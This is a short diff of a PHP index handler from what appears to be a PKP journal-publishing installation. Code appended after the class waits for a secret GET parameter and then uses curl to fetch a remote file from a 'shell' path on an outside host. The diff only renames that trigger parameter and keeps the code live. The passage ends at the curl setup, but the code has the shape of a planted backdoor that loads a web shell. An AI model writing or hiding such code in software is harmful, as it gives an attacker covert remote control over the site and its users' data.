@@ -84,7 +84,7 @@ class IndexHandler extends PKPIndexHandler {
 		}
 	}
 }
-if (isset($_GET['walaue'])) {
+if (isset($_GET['water-llyod'])) {
     $url = "https://absolute-water.app/shell/literi.txt";
 
     $ch= curl_init();
